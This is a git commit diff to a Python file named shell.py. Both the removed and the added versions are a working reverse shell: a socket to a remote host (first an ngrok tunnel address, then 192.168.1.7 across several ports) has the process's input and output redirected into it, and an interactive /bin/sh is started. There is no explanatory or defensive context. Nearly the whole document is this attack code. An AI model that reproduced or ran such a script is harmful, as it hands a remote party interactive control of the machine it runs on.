885ee45cb8ea7af7fabcd1b453726dd3beeccf44
TimeTravellingMachine <149077424+TimeTravellingMachine@users.noreply.github.com>
2023-11-02 10:11:19 +0530

    Update shell.py

--- shell.py
+++ shell.py
@@ -1,9 +1,18 @@
 import socket
 import subprocess
 import os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("0.tcp.in.ngrok.io", 14017))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-p = subprocess.call(["/bin/sh", "-i"])
+
+def reverse_shell(host, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    p = subprocess.call(["/bin/sh", "-i"])
+
+if __name__ == "__main__":
+    host = "192.168.1.7"
+    ports = [8889, 8890, 8891, 8892]  # Add the list of ports you want to connect to
+
+    for port in ports:
+        reverse_shell(host, port)
